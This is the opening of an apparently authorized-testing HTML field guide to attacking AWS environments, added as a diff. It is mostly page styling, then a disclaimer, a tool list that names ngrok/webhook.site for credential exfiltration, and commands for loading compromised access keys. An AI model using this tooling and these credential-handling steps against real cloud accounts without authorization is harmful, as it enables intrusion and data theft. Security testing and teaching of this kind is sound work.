@@ -1,0 +1,2966 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS Penetration Testing — Field Guide</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700;800&display=swap');
+
+  :root {
+    --bg-0:      #070B13;
+    --bg-1:      #0D1320;
+    --bg-2:      #111827;
+    --bg-3:      #1A2133;
+    --bg-code:   #0A0F1A;
+    --border:    #1E2D45;
+    --border-hi: #2D4060;
+
+    --violet:    #7C3AED;
+    --violet-hi: #9D5CF7;
+    --violet-lo: #4C1D95;
+    --cyan:      #06B6D4;
+    --cyan-hi:   #22D3EE;
+    --green:     #10B981;
+    --green-hi:  #34D399;
+    --red:       #EF4444;
+    --red-hi:    #F87171;
+    --amber:     #F59E0B;
+    --amber-hi:  #FCD34D;
+    --rose:      #F43F5E;
+
+    --text-0:    #F8FAFC;
+    --text-1:    #CBD5E1;
+    --text-2:    #94A3B8;
+    --text-3:    #64748B;
+
+    --sidebar-w: 260px;
+    --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
+    --font-body: 'Inter', system-ui, sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; font-size: 15px; }
+
+  body {
+    background: var(--bg-0);
+    color: var(--text-1);
+    font-family: var(--font-body);
+    line-height: 1.7;
+    display: flex;
+    min-height: 100vh;
+  }
+
+  /* ─── SIDEBAR ─────────────────────────────────────────── */
+  #sidebar {
+    width: var(--sidebar-w);
+    min-width: var(--sidebar-w);
+    background: var(--bg-1);
+    border-right: 1px solid var(--border);
+    height: 100vh;
+    position: sticky;
+    top: 0;
+    overflow-y: auto;
+    overflow-x: hidden;
+    flex-shrink: 0;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border-hi) transparent;
+  }
+
+  #sidebar::-webkit-scrollbar { width: 4px; }
+  #sidebar::-webkit-scrollbar-thumb { background: var(--border-hi); border-radius: 2px; }
+
+  .sb-header {
+    padding: 20px 16px 16px;
+    border-bottom: 1px solid var(--border);
+    position: sticky;
+    top: 0;
+    background: var(--bg-1);
+    z-index: 2;
+  }
+
+  .sb-logo {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: var(--violet-hi);
+    font-family: var(--font-mono);
+    margin-bottom: 4px;
+  }
+
+  .sb-logo svg { flex-shrink: 0; }
+
+  .sb-title {
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--text-0);
+    line-height: 1.3;
+  }
+
+  .sb-search {
+    margin: 12px 12px 0;
+    position: relative;
+  }
+
+  .sb-search input {
+    width: 100%;
+    background: var(--bg-2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text-0);
+    font-family: var(--font-body);
+    font-size: 12px;
+    padding: 7px 10px 7px 30px;
+    outline: none;
+    transition: border-color .2s;
+  }
+
+  .sb-search input:focus { border-color: var(--violet); }
+  .sb-search input::placeholder { color: var(--text-3); }
+
+  .sb-search-icon {
+    position: absolute;
+    left: 8px; top: 50%;
+    transform: translateY(-50%);
+    color: var(--text-3);
+    pointer-events: none;
+  }
+
+  .sb-nav { padding: 8px 0 24px; }
+
+  .sb-section-label {
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: var(--text-3);
+    padding: 12px 16px 4px;
+  }
+
+  .sb-link {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 16px;
+    font-size: 12.5px;
+    color: var(--text-2);
+    text-decoration: none;
+    border-left: 2px solid transparent;
+    transition: all .15s;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  .sb-link:hover { color: var(--text-0); background: var(--bg-2); }
+  .sb-link.active { color: var(--violet-hi); border-left-color: var(--violet-hi); background: rgba(124,58,237,.08); }
+
+  .sb-phase-dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+
+  /* ─── MAIN ────────────────────────────────────────────── */
+  #main {
+    flex: 1;
+    min-width: 0;
+    max-width: 960px;
+    padding: 0 48px 120px;
+  }
+
+  /* ─── HERO ────────────────────────────────────────────── */
+  .hero {
+    padding: 56px 0 48px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 64px;
+  }
+
+  .hero-eyebrow {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--font-mono);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: .14em;
+    text-transform: uppercase;
+    color: var(--violet-hi);
+    margin-bottom: 16px;
+  }
+
+  .hero-eyebrow-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--violet-hi);
+    animation: pulse 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: .4; transform: scale(.7); }
+  }
+
+  .hero h1 {
+    font-size: 42px;
+    font-weight: 800;
+    line-height: 1.1;
+    color: var(--text-0);
+    letter-spacing: -.02em;
+    margin-bottom: 16px;
+  }
+
+  .hero h1 span {
+    background: linear-gradient(135deg, var(--violet-hi) 0%, var(--cyan) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .hero-sub {
+    font-size: 16px;
+    color: var(--text-2);
+    max-width: 620px;
+    margin-bottom: 32px;
+    line-height: 1.6;
+  }
+
+  .hero-meta {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: .06em;
+    text-transform: uppercase;
+    padding: 4px 10px;
+    border-radius: 4px;
+    border: 1px solid;
+  }
+
+  .badge-violet { color: var(--violet-hi); border-color: var(--violet-lo); background: rgba(124,58,237,.1); }
+  .badge-cyan   { color: var(--cyan-hi);   border-color: rgba(6,182,212,.3); background: rgba(6,182,212,.08); }
+  .badge-amber  { color: var(--amber-hi);  border-color: rgba(245,158,11,.3); background: rgba(245,158,11,.08); }
+  .badge-red    { color: var(--red-hi);    border-color: rgba(239,68,68,.3); background: rgba(239,68,68,.08); }
+  .badge-green  { color: var(--green-hi);  border-color: rgba(16,185,129,.3); background: rgba(16,185,129,.08); }
+
+  /* ─── ATTACK FLOW DIAGRAM ─────────────────────────────── */
+  .attack-flow {
+    background: var(--bg-1);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 28px 24px;
+    margin: 48px 0 64px;
+    overflow-x: auto;
+  }
+
+  .attack-flow h3 {
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: var(--text-3);
+    margin-bottom: 20px;
+    font-family: var(--font-mono);
+  }
+
+  .flow-chain {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    min-width: max-content;
+  }
+
+  .flow-node {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .flow-box {
+    padding: 8px 14px;
+    border-radius: 8px;
+    border: 1px solid;
+    font-size: 11px;
+    font-weight: 600;
+    text-align: center;
+    white-space: nowrap;
+    font-family: var(--font-mono);
+    letter-spacing: .02em;
+  }
+
+  .flow-box.phase-1 { color: var(--cyan-hi);   border-color: rgba(6,182,212,.4);   background: rgba(6,182,212,.07);  }
+  .flow-box.phase-2 { color: var(--amber-hi);  border-color: rgba(245,158,11,.4);  background: rgba(245,158,11,.07); }
+  .flow-box.phase-3 { color: var(--violet-hi); border-color: rgba(124,58,237,.4);  background: rgba(124,58,237,.1);  }
+  .flow-box.phase-4 { color: var(--red-hi);    border-color: rgba(239,68,68,.4);   background: rgba(239,68,68,.07);  }
+  .flow-box.phase-5 { color: var(--rose);      border-color: rgba(244,63,94,.4);   background: rgba(244,63,94,.07);  }
+  .flow-box.phase-6 { color: var(--green-hi);  border-color: rgba(16,185,129,.4);  background: rgba(16,185,129,.07); }
+
+  .flow-num {
+    font-size: 10px;
+    color: var(--text-3);
+    font-family: var(--font-mono);
+  }
+
+  .flow-arrow {
+    color: var(--text-3);
+    padding: 0 6px;
+    font-size: 16px;
+    margin-bottom: 20px;
+  }
+
+  /* ─── SECTIONS ────────────────────────────────────────── */
+  .section {
+    margin-bottom: 72px;
+    scroll-margin-top: 24px;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: flex-start;
+    gap: 16px;
+    margin-bottom: 28px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .phase-icon {
+    width: 44px; height: 44px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 20px;
+    flex-shrink: 0;
+    border: 1px solid;
+  }
+
+  .phase-icon.c  { background: rgba(6,182,212,.1);  border-color: rgba(6,182,212,.3);  }
+  .phase-icon.a  { background: rgba(245,158,11,.1); border-color: rgba(245,158,11,.3); }
+  .phase-icon.v  { background: rgba(124,58,237,.1); border-color: rgba(124,58,237,.3); }
+  .phase-icon.r  { background: rgba(239,68,68,.1);  border-color: rgba(239,68,68,.3);  }
+  .phase-icon.rs { background: rgba(244,63,94,.1);  border-color: rgba(244,63,94,.3);  }
+  .phase-icon.g  { background: rgba(16,185,129,.1); border-color: rgba(16,185,129,.3); }
+  .phase-icon.gr { background: rgba(100,116,139,.1);border-color: rgba(100,116,139,.3);}
+
+  .section-meta {}
+
+  .phase-label {
+    font-family: var(--font-mono);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: .14em;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+
+  .section h2 {
+    font-size: 26px;
+    font-weight: 800;
+    color: var(--text-0);
+    line-height: 1.2;
+    letter-spacing: -.02em;
+  }
+
+  .section h3 {
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--text-0);
+    margin: 32px 0 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .section h3::before {
+    content: '';
+    display: block;
+    width: 3px;
+    height: 14px;
+    border-radius: 2px;
+    background: var(--violet);
+    flex-shrink: 0;
+  }
+
+  .section h4 {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-0);
+    margin: 20px 0 8px;
+    font-family: var(--font-mono);
+  }
+
+  .section p {
+    color: var(--text-2);
+    margin-bottom: 12px;
+    font-size: 14px;
+  }
+
+  .section ul, .section ol {
+    padding-left: 20px;
+    margin-bottom: 12px;
+  }
+
+  .section li {
+    color: var(--text-2);
+    font-size: 14px;
+    margin-bottom: 6px;
+  }
+
+  .section li strong { color: var(--text-0); }
+
+  /* ─── CODE BLOCKS ─────────────────────────────────────── */
+  .cmd-block {
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin: 12px 0 20px;
+    overflow: hidden;
+    position: relative;
+  }
+
+  .cmd-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 14px;
+    background: rgba(255,255,255,.03);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .cmd-label {
+    font-family: var(--font-mono);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: .1em;
+    text-transform: uppercase;
+    color: var(--text-3);
+  }
+
+  .cmd-label.bash  { color: var(--cyan); }
+  .cmd-label.py    { color: #4ADE80; }
+  .cmd-label.json  { color: var(--amber); }
+  .cmd-label.note  { color: var(--violet-hi); }
+
+  .copy-btn {
+    background: none;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--text-3);
+    font-size: 11px;
+    padding: 3px 8px;
+    cursor: pointer;
+    font-family: var(--font-body);
+    transition: all .15s;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+
+  .copy-btn:hover { color: var(--text-0); border-color: var(--border-hi); background: var(--bg-3); }
+  .copy-btn.copied { color: var(--green-hi); border-color: var(--green); }
+
+  .cmd-body {
+    padding: 16px;
+    overflow-x: auto;
+  }
+
+  .cmd-body pre {
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+    line-height: 1.7;
+    color: var(--text-1);
+    white-space: pre;
+  }
+
+  /* Syntax coloring inside pre */
+  .t-cmd   { color: var(--cyan-hi); }   /* commands */
+  .t-flag  { color: var(--violet-hi); } /* flags */
+  .t-val   { color: #FCD34D; }           /* values/strings */
+  .t-cmt   { color: var(--text-3); font-style: italic; } /* comments */
+  .t-var   { color: var(--green-hi); }  /* variables / profile names */
+  .t-key   { color: var(--rose); }      /* keywords */
+  .t-url   { color: var(--cyan); text-decoration: underline; }
+
+  /* ─── CALLOUTS ────────────────────────────────────────── */
+  .callout {
+    display: flex;
+    gap: 12px;
+    padding: 14px 16px;
+    border-radius: 8px;
+    border: 1px solid;
+    margin: 16px 0;
+    font-size: 13px;
+    line-height: 1.6;
+  }
+
+  .callout-icon { flex-shrink: 0; font-size: 16px; margin-top: 1px; }
+
+  .callout p { color: inherit; margin: 0; font-size: 13px; }
+  .callout strong { font-weight: 700; }
+
+  .callout.tip    { color: var(--green-hi);  border-color: rgba(16,185,129,.3);  background: rgba(16,185,129,.06);  }
+  .callout.warn   { color: var(--amber-hi);  border-color: rgba(245,158,11,.3);  background: rgba(245,158,11,.06);  }
+  .callout.danger { color: var(--red-hi);    border-color: rgba(239,68,68,.3);   background: rgba(239,68,68,.06);   }
+  .callout.info   { color: var(--cyan-hi);   border-color: rgba(6,182,212,.3);   background: rgba(6,182,212,.06);   }
+  .callout.note   { color: var(--violet-hi); border-color: rgba(124,58,237,.3);  background: rgba(124,58,237,.06);  }
+
+  /* ─── TABLES ──────────────────────────────────────────── */
+  .tbl-wrap {
+    overflow-x: auto;
+    margin: 16px 0 24px;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13px;
+  }
+
+  thead tr { background: rgba(255,255,255,.03); }
+
+  th {
+    font-family: var(--font-mono);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: .1em;
+    text-transform: uppercase;
+    color: var(--text-3);
+    padding: 10px 14px;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+
+  td {
+    padding: 9px 14px;
+    color: var(--text-2);
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+  }
+
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(255,255,255,.02); }
+
+  td code, p code, li code {
+    font-family: var(--font-mono);
+    font-size: 11.5px;
+    background: var(--bg-3);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 1px 5px;
+    color: var(--cyan-hi);
+  }
+
+  td strong { color: var(--text-0); }
+
+  /* ─── ATTACK CARDS ────────────────────────────────────── */
+  .attack-card {
+    background: var(--bg-1);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    margin: 16px 0;
+    overflow: hidden;
+  }
+
+  .attack-card-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 18px;
+    cursor: pointer;
+    user-select: none;
+    transition: background .15s;
+  }
+
+  .attack-card-header:hover { background: var(--bg-2); }
+
+  .attack-card-title {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--text-0);
+  }
+
+  .attack-card-chevron {
+    color: var(--text-3);
+    transition: transform .2s;
+    font-size: 12px;
+  }
+
+  .attack-card.open .attack-card-chevron { transform: rotate(90deg); }
+
+  .attack-card-body {
+    display: none;
+    padding: 0 18px 18px;
+    border-top: 1px solid var(--border);
+    padding-top: 16px;
+  }
+
+  .attack-card.open .attack-card-body { display: block; }
+
+  /* ─── RISK TAGS ───────────────────────────────────────── */
+  .risk {
+    display: inline-block;
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: 2px 7px;
+    border-radius: 3px;
+    font-family: var(--font-mono);
+  }
+
+  .risk-crit { background: rgba(239,68,68,.2);   color: var(--red-hi);    border: 1px solid rgba(239,68,68,.4);   }
+  .risk-high { background: rgba(245,158,11,.15); color: var(--amber-hi);  border: 1px solid rgba(245,158,11,.4);  }
+  .risk-med  { background: rgba(124,58,237,.15); color: var(--violet-hi); border: 1px solid rgba(124,58,237,.4);  }
+  .risk-low  { background: rgba(16,185,129,.12); color: var(--green-hi);  border: 1px solid rgba(16,185,129,.4);  }
+
+  /* ─── DIVIDER ─────────────────────────────────────────── */
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 40px 0;
+  }
+
+  /* ─── DISCLAIMER BOX ──────────────────────────────────── */
+  .disclaimer {
+    background: rgba(239,68,68,.06);
+    border: 1px solid rgba(239,68,68,.25);
+    border-radius: 10px;
+    padding: 18px 20px;
+    margin-bottom: 40px;
+    font-size: 13px;
+    color: var(--text-2);
+    line-height: 1.6;
+  }
+
+  .disclaimer strong { color: var(--red-hi); }
+
+  /* ─── SCROLL TO TOP ───────────────────────────────────── */
+  #scroll-top {
+    position: fixed;
+    bottom: 28px;
+    right: 28px;
+    width: 38px; height: 38px;
+    background: var(--bg-2);
+    border: 1px solid var(--border-hi);
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    color: var(--text-3);
+    font-size: 14px;
+    transition: all .2s;
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  #scroll-top.visible { opacity: 1; pointer-events: all; }
+  #scroll-top:hover { color: var(--text-0); border-color: var(--violet); background: var(--bg-3); }
+
+  /* ─── TOC PROGRESS BAR ────────────────────────────────── */
+  #progress-bar {
+    position: fixed;
+    top: 0; left: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--violet) 0%, var(--cyan) 100%);
+    z-index: 999;
+    width: 0%;
+    transition: width .1s linear;
+  }
+
+  @media (max-width: 768px) {
+    #sidebar { display: none; }
+    #main { padding: 0 20px 80px; }
+    .hero h1 { font-size: 28px; }
+  }
+</style>
+</head>
+<body>
+
+<div id="progress-bar"></div>
+
+<!-- ─── SIDEBAR ─────────────────────────────────────────── -->
+<nav id="sidebar">
+  <div class="sb-header">
+    <div class="sb-logo">
+      <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+        <rect x="1" y="1" width="5" height="5" rx="1" fill="#7C3AED"/>
+        <rect x="8" y="1" width="5" height="5" rx="1" fill="#06B6D4"/>
+        <rect x="1" y="8" width="5" height="5" rx="1" fill="#06B6D4"/>
+        <rect x="8" y="8" width="5" height="5" rx="1" fill="#7C3AED" opacity=".4"/>
+      </svg>
+      AWS Security
+    </div>
+    <div class="sb-title">Penetration Testing Field Guide</div>
+  </div>
+  <div class="sb-search">
+    <svg class="sb-search-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+    <input type="text" id="sb-search-input" placeholder="Search sections…">
+  </div>
+  <div class="sb-nav" id="sb-nav">
+    <div class="sb-section-label">Overview</div>
+    <a href="#overview" class="sb-link"><span class="sb-phase-dot" style="background:#7C3AED"></span>Introduction</a>
+    <a href="#methodology" class="sb-link"><span class="sb-phase-dot" style="background:#7C3AED"></span>Methodology</a>
+    <a href="#tooling" class="sb-link"><span class="sb-phase-dot" style="background:#7C3AED"></span>Tools &amp; Setup</a>
+
+    <div class="sb-section-label">Attack Phases</div>
+    <a href="#phase1" class="sb-link"><span class="sb-phase-dot" style="background:#06B6D4"></span>1 · Recon &amp; Creds</a>
+    <a href="#phase2" class="sb-link"><span class="sb-phase-dot" style="background:#F59E0B"></span>2 · Enumeration</a>
+    <a href="#phase3" class="sb-link"><span class="sb-phase-dot" style="background:#7C3AED"></span>3 · Privilege Escalation</a>
+    <a href="#phase4" class="sb-link"><span class="sb-phase-dot" style="background:#EF4444"></span>4 · Lateral Movement</a>
+    <a href="#phase5" class="sb-link"><span class="sb-phase-dot" style="background:#F43F5E"></span>5 · Persistence</a>
+    <a href="#phase6" class="sb-link"><span class="sb-phase-dot" style="background:#10B981"></span>6 · Exfiltration</a>
+
+    <div class="sb-section-label">Service Attacks</div>
+    <a href="#svc-iam" class="sb-link"><span class="sb-phase-dot" style="background:#6366F1"></span>IAM Deep-Dive</a>
+    <a href="#svc-s3" class="sb-link"><span class="sb-phase-dot" style="background:#F59E0B"></span>S3</a>
+    <a href="#svc-ec2" class="sb-link"><span class="sb-phase-dot" style="background:#06B6D4"></span>EC2 &amp; IMDS</a>
+    <a href="#svc-lambda" class="sb-link"><span class="sb-phase-dot" style="background:#A78BFA"></span>Lambda</a>
+    <a href="#svc-cognito" class="sb-link"><span class="sb-phase-dot" style="background:#F43F5E"></span>Cognito</a>
+    <a href="#svc-codebuild" class="sb-link"><span class="sb-phase-dot" style="background:#10B981"></span>CodeBuild</a>
+    <a href="#svc-beanstalk" class="sb-link"><span class="sb-phase-dot" style="background:#F59E0B"></span>Elastic Beanstalk</a>
+    <a href="#svc-stepfn" class="sb-link"><span class="sb-phase-dot" style="background:#7C3AED"></span>Step Functions</a>
+    <a href="#svc-eventbridge" class="sb-link"><span class="sb-phase-dot" style="background:#EF4444"></span>EventBridge</a>
+    <a href="#svc-secrets" class="sb-link"><span class="sb-phase-dot" style="background:#10B981"></span>Secrets Manager</a>
+    <a href="#svc-rds" class="sb-link"><span class="sb-phase-dot" style="background:#06B6D4"></span>RDS</a>
+    <a href="#svc-ecs-eks" class="sb-link"><span class="sb-phase-dot" style="background:#F59E0B"></span>ECS / EKS</a>
+
+    <div class="sb-section-label">Advanced</div>
+    <a href="#evasion" class="sb-link"><span class="sb-phase-dot" style="background:#64748B"></span>Defense Evasion</a>
+    <a href="#cross-account" class="sb-link"><span class="sb-phase-dot" style="background:#7C3AED"></span>Cross-Account</a>
+    <a href="#quickref" class="sb-link"><span class="sb-phase-dot" style="background:#06B6D4"></span>Quick Reference</a>
+  </div>
+</nav>
+
+<!-- ─── MAIN CONTENT ─────────────────────────────────────── -->
+<main id="main">
+
+  <!-- HERO -->
+  <div class="hero" id="overview">
+    <div class="hero-eyebrow">
+      <span class="hero-eyebrow-dot"></span>
+      Authorized Security Assessment
+    </div>
+    <h1>AWS Penetration Testing<br><span>Field Guide</span></h1>
+    <p class="hero-sub">
+      A comprehensive, command-level reference for conducting authorized AWS security assessments.
+      Covers the full attack lifecycle from initial assumed-compromise credential access through
+      privilege escalation, lateral movement, and data exfiltration — with hands-on CLI techniques
+      for every major AWS service.
+    </p>
+    <div class="hero-meta">
+      <span class="badge badge-violet">Black Box / Grey Box</span>
+      <span class="badge badge-cyan">Assumed Compromise</span>
+      <span class="badge badge-amber">AWS CLI Focused</span>
+      <span class="badge badge-red">Authorized Use Only</span>
+    </div>
+  </div>
+
+  <!-- DISCLAIMER -->
+  <div class="disclaimer">
+    <strong>⚠ Legal &amp; Authorization Notice:</strong>
+    All techniques in this guide are for use <strong>only on systems you own or have explicit written authorization to test</strong>.
+    Unauthorized access to AWS environments violates the Computer Fraud and Abuse Act (CFAA), AWS Acceptable Use Policy,
+    and equivalent laws globally. Always obtain a signed Statement of Work (SOW) and Rules of Engagement (RoE) before beginning.
+    AWS also requires prior notification for certain test types — check <strong>aws.amazon.com/security/penetration-testing</strong> before each engagement.
+  </div>
+
+  <!-- ATTACK FLOW -->
+  <div class="attack-flow" id="methodology">
+    <h3>// Attack Lifecycle</h3>
+    <div class="flow-chain">
+      <div class="flow-node">
+        <div class="flow-box phase-1">Initial Access<br>+ Recon</div>
+        <div class="flow-num">01</div>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">
+        <div class="flow-box phase-2">Enumeration<br>+ Discovery</div>
+        <div class="flow-num">02</div>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">
+        <div class="flow-box phase-3">Privilege<br>Escalation</div>
+        <div class="flow-num">03</div>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">
+        <div class="flow-box phase-4">Lateral<br>Movement</div>
+        <div class="flow-num">04</div>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">
+        <div class="flow-box phase-5">Persistence<br>+ Backdoors</div>
+        <div class="flow-num">05</div>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">
+        <div class="flow-box phase-6">Data<br>Exfiltration</div>
+        <div class="flow-num">06</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- TOOLING -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="tooling">
+    <div class="section-header">
+      <div class="phase-icon gr">🛠</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--text-3)">Prerequisites</div>
+        <h2>Tools &amp; Environment Setup</h2>
+      </div>
+    </div>
+
+    <h3>Core Toolkit</h3>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Tool</th><th>Purpose</th><th>Install</th></tr></thead>
+        <tbody>
+          <tr><td><strong>AWS CLI v2</strong></td><td>Primary interface — all enumeration &amp; exploitation</td><td><code>brew install awscli</code></td></tr>
+          <tr><td><strong>boto3</strong></td><td>Python SDK — scripting &amp; automation</td><td><code>pip install boto3</code></td></tr>
+          <tr><td><strong>Pacu</strong></td><td>AWS exploitation framework</td><td><code>pip install pacu</code></td></tr>
+          <tr><td><strong>ScoutSuite</strong></td><td>Multi-cloud security auditing</td><td><code>pip install scoutsuite</code></td></tr>
+          <tr><td><strong>CloudMapper</strong></td><td>Network exposure mapping</td><td>github.com/duo-labs/cloudmapper</td></tr>
+          <tr><td><strong>enumerate-iam</strong></td><td>Brute-force IAM permission discovery</td><td>github.com/andresriancho/enumerate-iam</td></tr>
+          <tr><td><strong>aws-nuke</strong></td><td>Cleanup after testing (use carefully!)</td><td>github.com/rebuy-de/aws-nuke</td></tr>
+          <tr><td><strong>Session Manager Plugin</strong></td><td>SSM-based EC2 shell access</td><td>AWS docs</td></tr>
+          <tr><td><strong>ngrok / webhook.site</strong></td><td>Credential exfiltration &amp; OOB testing</td><td>ngrok.com / webhook.site</td></tr>
+          <tr><td><strong>Docker</strong></td><td>Container-based attacks, ECR testing</td><td>docker.com</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>Credential Profile Management</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Configure the initial compromised credential set</span>
+<span class="t-cmd">aws configure</span> <span class="t-flag">--profile</span> <span class="t-var">target</span>
+<span class="t-cmt"># Prompts: Access Key ID, Secret Access Key, region (us-east-1 default), output (json)</span>
+
+<span class="t-cmt"># Or set directly via environment variables (avoids disk writes)</span>
+<span class="t-key">export</span> <span class="t-var">AWS_ACCESS_KEY_ID</span>=<span class="t-val">AKIA...</span>
+<span class="t-key">export</span> <span class="t-var">AWS_SECRET_ACCESS_KEY</span>=<span class="t-val">abc123...</span>
+<span class="t-key">export</span> <span class="t-var">AWS_DEFAULT_REGION</span>=<span class="t-val">us-east-1</span>
+
+<span class="t-cmt"># Use a named profile for all subsequent commands</span>
+<span class="t-key">export</span> <span class="t-var">AWS_PROFILE</span>=<span class="t-val">target</span>
+
+<span class="t-cmt"># Verify credentials are valid</span>
+<span class="t-cmd">aws sts get-caller-identity</span> <span class="t-flag">--profile</span> <span class="t-var">target</span>
+
+<span class="t-cmt"># Store assumed-role creds as a new profile</span>
+<span class="t-cmd">aws configure set</span> <span class="t-val">aws_access_key_id</span> $ACCESS_KEY <span class="t-flag">--profile</span> <span class="t-var">privesc</span>
+<span class="t-cmd">aws configure set</span> <span class="t-val">aws_secret_access_key</span> $SECRET_KEY <span class="t-flag">--profile</span> <span class="t-var">privesc</span>
+<span class="t-cmd">aws configure set</span> <span class="t-val">aws_session_token</span> $SESSION_TOKEN <span class="t-flag">--profile</span> <span class="t-var">privesc</span>
+<span class="t-cmd">aws configure set</span> <span class="t-val">region</span> us-east-1 <span class="t-flag">--profile</span> <span class="t-var">privesc</span></pre></div>
+    </div>
+
+    <div class="callout tip">
+      <span class="callout-icon">💡</span>
+      <p><strong>Tip:</strong> Use <code>--output json</code> combined with <code>jq</code> for reliable field extraction. For example:
+      <code>aws iam list-users | jq '.Users[].UserName'</code>. Keep multiple profiles per lab and never overwrite the initial low-priv profile — you may need to fall back to it.</p>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- PHASE 1: INITIAL ACCESS + RECON -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="phase1">
+    <div class="section-header">
+      <div class="phase-icon c">🔑</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--cyan)">Phase 01</div>
+        <h2>Initial Access &amp; Reconnaissance</h2>
+      </div>
+    </div>
+
+    <p>In most assumed-compromise scenarios you receive a static IAM access key pair (or temporary STS credentials). Your first goal is to understand <em>who</em> you are, <em>what account</em> you're in, and establish foundational situational awareness before touching anything that logs heavily.</p>
+
+    <h3>Identity Verification</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># WHO AM I — always run this first</span>
+<span class="t-cmd">aws sts get-caller-identity</span>
+
+<span class="t-cmt"># Returns: UserId, Account, Arn
+# If Arn contains :assumed-role/ → you have temporary role creds
+# If Arn contains :user/ → you have long-term user creds
+# If Arn contains :federated-user/ → federated identity</span>
+
